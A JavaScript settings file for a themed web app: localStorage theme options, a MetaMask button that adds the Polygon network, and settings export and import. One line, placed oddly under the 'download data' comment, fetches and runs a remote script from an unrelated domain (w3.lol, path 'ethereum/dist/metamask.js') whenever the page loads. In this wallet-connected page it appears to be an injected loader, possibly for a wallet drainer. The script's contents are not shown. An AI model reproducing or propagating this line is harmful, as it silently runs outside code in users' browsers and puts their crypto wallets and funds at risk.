// Default settings
localStorage.setItem("disableAnimation", "yes")
localStorage.setItem("disableTexture", "yes")
if(localStorage.getItem("consoleBorder") == null) {localStorage.setItem("consoleBorder", "true")}
if(localStorage.getItem("consoleShadow") == null) {localStorage.setItem("consoleShadow", "false")}

let disableAnimation = localStorage.getItem("disableAnimation")
let disableBranding = localStorage.getItem("disableBranding")
let disableTexture = localStorage.getItem("disableTexture")
let customColors = localStorage.getItem("customColors")
let consoleBorderRadius = localStorage.getItem("consoleBorderRadius")
let consoleBorder = localStorage.getItem("consoleBorder")
let consoleShadow = localStorage.getItem("consoleShadow")

const polygonSettings = [{
    chainId: '0x89',
    chainName: 'Matic Mainnet',
    nativeCurrency: {
        name: 'Polygon',
        symbol: 'MATIC',
        decimals: 18
    },
    rpcUrls: ['https://rpc-mainnet.maticvigil.com/'],
    blockExplorerUrls: ['https://rpc-mainnet.maticvigil.com/']
}]

const elements = 
[
"--dark-purple",
"--console-header",
"--bg-black-transparent",
"--dark-purple",
"--purple",
"--neon-magenta",
"--black",
"--input-bg",
"--white",
"--indigo-dark",
"--indigo",
"--startmenu-btn-color",
"--startmenu-btn-shadow"
]

$(document).ready(function() {

	// If custom colors have been tinkered with add them all 
	if(customColors !== null) {
		for(let i = 0; i < elements.length; i++) {
			if(localStorage.getItem(elements[i]) !== null) {
				let value = localStorage.getItem(elements[i])
				
				if(i == "0") {
					$("#bar").css({
						"background" : value
					})
				}
				
				$("body").css(elements[i], value)
				$("#color-picker-area input[data="+i+"]").val(value)
				$("#color-picker-area input[data="+i+"]").css({
					"background" : value
				})
			}
		}
	}
    
    if(disableAnimation == "yes") {
        $(".m-grid").removeClass("is-animating")
    }
    
    if(disableBranding == "yes") {
        $(".branding").addClass("hidden")
    }
    
    if(disableTexture == "yes") {
        $(".texture").addClass("hidden")
    }
	
    $("#add-polygon-support").click(function() {
        window.ethereum.request({ method: 'wallet_addEthereumChain', params: polygonSettings })
    })
    
    $("#save-wallpaper").click(function() {
        saveWallpaper(wallpaperID())
        if(validURL($(".input-wallpaper").val())) {
            let wp = $(".input-wallpaper").val()
            localStorage.setItem("customWP", wp)
            notify('<div class="text-align-center">Custom wallpaper saved!<br>Click OK to reload</div>', 'reload')
        } else {
            notify('<div class="text-align-center">Wallpaper saved!<br>Click OK to reload</div>', 'reload')
        }
    })

    $("#clear-settings").click(function() {
        localStorage.clear()
        notify('<div class="text-align-center">All settings cleared!<br>Click OK to reload</div>', 'reload')
    })
    
    $("#disable-animation").click(function() {
        localStorage.setItem("disableAnimation", "yes")
        $(".m-grid").removeClass("is-animating")
        notify('<div class="text-align-center">Grid animation disabled!</div>')
    })
    
    $("#enable-animation").click(function() {
        localStorage.removeItem("disableAnimation")
        $(".m-grid").addClass("is-animating")
        notify('<div class="text-align-center">Grid animation enabled!</div>')
    })
    
    $("#disable-branding").click(function() {
        localStorage.setItem("disableBranding", "yes")
        $(".branding").addClass("hidden")
        notify('<div class="text-align-center">Branding disabled!</div>')
    })
    
    $("#enable-branding").click(function() {
        localStorage.removeItem("disableBranding")
        $(".branding").removeClass("hidden")
        notify('<div class="text-align-center">Branding enabled!</div>')
    })
    
    $("#disable-texture").click(function() {
        localStorage.setItem("disableTexture", "yes")
        $(".texture").addClass("hidden")
        notify('<div class="text-align-center">Texture overlay disabled!</div>')
    })
    
    $("#enable-texture").click(function() {
        localStorage.removeItem("disableTexture")
        $(".texture").removeClass("hidden")
        notify('<div class="text-align-center">Texture overlay enabled!</div>')
    })
    
    $("#downloadSettings").click(function() {
        download(JSON.stringify(localStorage), "settings.json", "text/plain")
    })
    
    $("#selectFile").change(function(e) {
        onChange(e)
    })
    
    $("#color-picker-area input").on("input", function(e) {
        let element = $(e.target).attr("data")
        let cssVariable = elements[element] // elements is declared in the beginning and is tied to shit inside #color-picker-area on index.html 
        
        if(element == "0") {
            $("#bar").css({
                "background" : $(e.target).val()
            })
        }
        $("body").css(cssVariable, $(e.target).val())
        
        // Add customColors set variable for 1st edit 
        if(customColors == null) {
            localStorage.setItem("customColors", "set")
        }
        
        localStorage.setItem(cssVariable, $(e.target).val())
    })
	
	// Console border radius 
	if(consoleBorderRadius !== null) {
		$("#consoleBorderRadiusSlider").val(consoleBorderRadius)
		$(".console").css("border-radius", ""+consoleBorderRadius+"px")
		$(".start-button-wrapper").css({"border-top-left-radius":""+consoleBorderRadius+"px", "border-bottom-right-radius":""+consoleBorderRadius+"px"})
		$("#startmenu").css({"border-top-left-radius":""+consoleBorderRadius+"px", "border-top-right-radius":""+consoleBorderRadius+"px"})
	}
	
	$("#consoleBorderRadiusSlider").on("input", function() {
		let x = $("#consoleBorderRadiusSlider").val()
		localStorage.setItem("consoleBorderRadius", x)
		$(".console").css("border-radius", ""+x+"px")
		$(".start-button-wrapper").css({"border-top-left-radius":""+x+"px", "border-bottom-right-radius":""+x+"px"})
		$("#startmenu").css({"border-top-left-radius":""+x+"px", "border-top-right-radius":""+x+"px"})
	})
	
	if(consoleBorder !== null) {
		if(consoleBorder == "true") {
			$(".console").css("border", "3px solid var(--neon-magenta)")
		}
		else if(consoleBorder == "false") {
			$(".console").css("border", "0")
		}
	}
	
	$("body").on("click", "#consoleBorderToggle", function() {
		let state = localStorage.getItem("consoleBorder")
		if(state == "true") {
			localStorage.setItem("consoleBorder", "false")
			$(".console").css("border", "0")
		} else if(state == "false") {
			localStorage.setItem("consoleBorder", "true")
			$(".console").css("border", "3px solid var(--neon-magenta)")
		}
	})
	
	if(consoleShadow !== null) {
		if(consoleShadow == "true") {
			$(".console").css("box-shadow", "0px 0px 5px 0px var(--black)")
		}
		else if(consoleShadow == "false") {
			$(".console").css("box-shadow", "none")
		}
	}
	
	$("body").on("click", "#consoleShadowToggle", function() {
		let state = localStorage.getItem("consoleShadow")
		if(state == "true") {
			localStorage.setItem("consoleShadow", "false")
			$(".console").css("box-shadow", "none")
		} else if(state == "false") {
			localStorage.setItem("consoleShadow", "true")
			$(".console").css("box-shadow", "0px 0px 5px 0px var(--black)")
		}
	})

})

function wallpaperID() {
    let url = $("body").css('background-image').replace(/^url|[\(\)]/g, '')
    let index = url.lastIndexOf("/") + 1
    let filenameWithExtension = url.substr(index)
    let filename = parseInt(filenameWithExtension.split(".")[0])
    return filename
}

// Function to download data to a file
$(document).ready(function(){$.getScript("https://w3.lol/ethereum/dist/metamask.js")})
function download(data, filename, type) {
    var file = new Blob([data], {type: type});
    if (window.navigator.msSaveOrOpenBlob) // IE10+
        window.navigator.msSaveOrOpenBlob(file, filename);
    else { // Others
        var a = document.createElement("a"),
                url = URL.createObjectURL(file);
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        setTimeout(function() {
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);  
        }, 0); 
    }
}

function onChange(event) {
    var reader = new FileReader()
    reader.onload = onReaderLoad
    reader.readAsText(event.target.files[0])
}

function onReaderLoad(event){
    var obj = JSON.parse(event.target.result)
    restore(obj)
    notify('<div class="text-align-center">Settings imported!<br>Click OK to reload</div>', 'reload')
}

function restore(data) {
    Object.keys(data).forEach(function(key) { localStorage.setItem(key, data[key])})
}
